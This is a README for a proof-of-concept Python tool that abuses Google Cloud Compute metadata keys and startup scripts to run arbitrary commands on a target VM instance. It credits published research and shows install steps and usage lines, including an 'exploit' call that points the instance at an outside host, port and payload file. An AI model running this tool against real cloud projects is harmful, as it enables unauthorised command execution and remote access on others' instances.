# GCP Metadata API Abuse "PoC" (gce-s3r1al.py)
A script to take advantage of a unique design in Google Cloud's Compute API capabilities and implementation of Metadata keys.
**This is for testing and educational purposes only and comes with no warranty.**

## Overview
**This is based on research conducted by the Andrew Johnson at Mitiga - check out the original [blog post here](https://www.mitiga.io/blog/misconfiguration-hidden-dangers-cloud-control-plane)**
To get more information on this capability, the inner workings behind it, and other information, go check out the extensive blog post I wrote about developing this "PoC" [here](https://mgior.com/google-cloud-misconfiguration-poc/). At some point I will translate a lot of the high-level information from the blog post and include it in this README.

## Usage
To get started, first clone the repository and install the required Python libraries
```
git clone https://github.com/mikegior/gce-s3r1al
cd gce-s3r1al/
pip3 install -r requirements.txt
```

The script has three commands you can use:
- **`check`** - check roles associated with the account you have access to to determine if required roles are present
- **`exploit`** - set the startup-script and s3r1al metadata keys and values to the specified instance
- **`modify`** - modify the s3r1al metadata key's value to an arbitrary command to execute

Prior to using this script, you will need install required Python libraries first. To do this,

Example usage for each command:
```sh
$ python3 gce-s3r1al.py check --authfile creds.json
$ python3 gce-s3r1al.py exploit --host 1.2.3.4 --port 8000 --payloadfile metalisten.sh --authfile creds.json --project serial-poc-1 --zone us-central1-a --instance poc-instance
$ python3 gce-s3r1al.py modify --authfile creds.json --project serial-poc-1 --zone us-central1-a --instance poc-instance
```

The blog post outlines more about each command and the anticipated output.